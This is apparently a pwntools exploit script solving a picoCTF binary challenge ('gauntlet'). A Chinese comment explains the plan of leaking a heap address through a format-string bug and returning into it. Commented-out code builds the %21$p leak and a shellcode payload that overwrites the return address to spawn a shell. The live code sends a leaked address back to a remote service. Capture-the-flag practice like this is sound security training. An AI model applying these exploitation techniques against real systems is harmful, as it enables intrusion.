# nc mercury.picoctf.net 49704

# 先格式化字符串漏洞，泄露堆上的s地址，然后返回跳转到那里
from pwn import *

# context.os = "linux"
# context.arch = "amd64"
# context.log_level = "debug"
# if args. LOCAL:
#     p = process("./gauntlet")
# else:
#     p = remote("mercury.picoctf.net", 49704)

# # payload = ''

# pop_rdi = 0x400793
# pop_rsi = 0x400791
# wx_Sec_addr = 0x7ffff7fbb000

# shellcode = asm(shellcraft.amd64.sh())
# destaddr = 0x6022a0
# mainaddr = 0x400687

# payload1 = b'%21$p'
# p.sendline(payload1)
# raw = p.recvline()
# print(raw)  

# s_addr = int(raw[:-1], 16)
# p.success("s addr: {}".format(hex(s_addr)))

# payload2 = shellcode.ljust(0x78, b'a')+p64(s_addr)
# # p.sendline("test")
# # p.recvline()

# p.sendline(payload2)
# p.interactive()

p = remote("111.186.57.85", 30251)

p.recvuntil("how ")
x = p.recv(18)
data = int(x.decode(), 16)

p.sendlineafter("memory?\n", p64(data))
p.interactive()